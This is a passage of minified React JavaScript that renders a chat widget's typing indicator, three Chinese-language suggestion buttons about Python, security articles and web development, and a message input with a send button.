gap-1",children:[(0,t.jsx)("span",{className:"animate-bounce",style:{animationDelay:"0ms"},children:"."}),(0,t.jsx)("span",{className:"animate-bounce",style:{animationDelay:"150ms"},children:"."}),(0,t.jsx)("span",{className:"animate-bounce",style:{animationDelay:"300ms"},children:"."})]})})}),(0,t.jsx)("div",{ref:h})]}),(0,t.jsx)("div",{className:"px-3 pb-2 flex gap-1.5 flex-wrap shrink-0",children:["Python 学习路线","推荐安全文章","Web开发入门"].map(e=>(0,t.jsx)("button",{onClick:()=>{c(e)},className:"px-2.5 py-1 text-xs rounded-full border border-card-border text-muted hover:text-foreground hover:border-accent/50 transition-all",children:e},e))}),(0,t.jsx)("div",{className:"p-3 border-t border-card-border shrink-0",children:(0,t.jsxs)("div",{className:"flex gap-2",children:[(0,t.jsx)("input",{type:"text",value:l,onChange:e=>c(e.target.value),onKeyDown:e=>"Enter"===e.key&&p(),placeholder:"问我任何技术问题...",className:"flex-1 px-3 py-2 rounded-lg border border-card-border bg-card text-sm focus:outline-none focus:border-accent transition-colors"}),(0,t.jsx)("button",{onClick:p,disabled:!l.trim(),className:"px-3 py-2 rounded-lg bg-accent text-white text-sm hover:bg-accent-hover transition-all disabled:opacity-40 disabled:cursor-not-allowed",children:"发送"})]})})]})]})}])}]);